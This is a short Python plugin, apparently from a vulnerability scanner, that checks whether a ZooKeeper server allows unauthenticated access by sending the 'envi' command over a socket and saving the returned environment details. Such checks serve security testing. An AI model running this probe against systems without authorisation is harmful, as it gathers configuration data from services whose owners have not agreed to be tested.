#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

import socket
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.ZOOKEEPER
        self.name = 'zookeeper unauth'
        self.keyword = ['zookeeper', 'unauth']
        self.info = 'Zookeeper unauth'
        self.type = 'unauth'
        self.level = 'medium'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.target_host, self.target_port))
            s.sendall(bytes('envi\r\n','utf-8'))
            message = str(s.recv(1024))
            s.close()
            if 'zookeeper.version' in message:
                self.flag = 1
                self.req.append({"info": "envi"})
                self.res.append({"info": "zookeeper unauth", 'key':'envi',"envi": message})
        except socket.timeout:
            pass
        except Exception as err:
            pass
